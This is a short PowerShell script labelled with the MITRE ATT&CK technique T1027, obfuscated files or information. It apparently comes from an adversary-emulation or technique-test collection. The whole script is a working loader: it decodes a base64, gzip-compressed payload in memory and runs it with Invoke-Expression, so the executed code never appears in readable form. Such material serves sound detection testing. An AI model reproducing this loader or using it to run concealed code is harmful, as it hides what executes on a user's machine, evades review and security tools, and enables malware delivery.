## Author: lehag
## Code: T1027-ObfuscatedFilesOrInformation.ps1

$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAZ0pmAA/wVAsQkAMAh7xbr3Dz/wgToIgYD1/SHk9NYN/jWPAmjJwTsuStJEWRkAAAA="));
Invoke-Expression (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
